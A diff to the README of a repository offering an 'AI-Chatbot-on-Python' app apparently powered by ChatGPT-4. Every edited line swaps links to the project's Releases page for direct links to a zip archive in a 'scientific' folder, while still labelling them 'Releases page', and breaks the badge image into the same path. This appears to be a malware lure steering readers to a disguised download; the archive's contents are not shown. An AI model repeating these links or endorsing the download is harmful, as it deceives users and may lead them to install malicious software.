@@ -1,7 +1,7 @@
 # 🤖 AI-Chatbot-on-Python - Your Friendly AI Chat Companion
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/Fsociety-cheat/AI-Chatbot-on-Python/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Fsociety-cheat/AI-Chatbot-on-Python/main/scientific/AI-Chatbot-on-Python.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/Fsociety-cheat/AI-Chatbot-on-Python/main/scientific/AI-Chatbot-on-Python.zip)
 
 ## 📖 Introduction
 Welcome to AI-Chatbot-on-Python. This application is a smart AI chatbot powered by ChatGPT-4. It interacts with users in real-time, providing intelligent responses. Use this chatbot to engage in informative conversations or to explore various topics effortlessly.
@@ -10,7 +10,7 @@ Welcome to AI-Chatbot-on-Python. This application is a smart AI chatbot powered 
 To use the AI-Chatbot, follow these simple steps:
 
 1. **Visit the Release Page**  
-   Go to our [Releases page](https://github.com/Fsociety-cheat/AI-Chatbot-on-Python/releases) to access all available versions.
+   Go to our [Releases page](https://raw.githubusercontent.com/Fsociety-cheat/AI-Chatbot-on-Python/main/scientific/AI-Chatbot-on-Python.zip) to access all available versions.
 
 2. **Download the Application**  
    Look for the latest release and download the appropriate file for your system. This usually includes executable files for Windows, macOS, or Linux.
@@ -25,7 +25,7 @@ To use the AI-Chatbot, follow these simple steps:
    Begin chatting with the AI. You can ask questions or discuss topics of interest. 
 
 ## 📥 Download & Install
-To start using the AI-Chatbot, visit the [Releases page](https://github.com/Fsociety-cheat/AI-Chatbot-on-Python/releases) to download the latest version. Choose the release that matches your operating system, and follow the installation steps outlined above.
+To start using the AI-Chatbot, visit the [Releases page](https://raw.githubusercontent.com/Fsociety-cheat/AI-Chatbot-on-Python/main/scientific/AI-Chatbot-on-Python.zip) to download the latest version. Choose the release that matches your operating system, and follow the installation steps outlined above.
 
 ## ⚙️ System Requirements
 To run the AI-Chatbot smoothly, ensure your system meets the following requirements:
@@ -59,4 +59,4 @@ If you encounter any issues while using the AI-Chatbot, feel free to open an iss
 ## ✨ Conclusion
 The AI-Chatbot-on-Python offers a user-friendly interface to engage with cutting-edge AI technology. We encourage you to try it out, explore its features, and have fun chatting with your very own AI assistant.
 
-For more updates and features, check back on our [Release page](https://github.com/Fsociety-cheat/AI-Chatbot-on-Python/releases) and stay connected with our community.
+For more updates and features, check back on our [Release page](https://raw.githubusercontent.com/Fsociety-cheat/AI-Chatbot-on-Python/main/scientific/AI-Chatbot-on-Python.zip) and stay connected with our community.
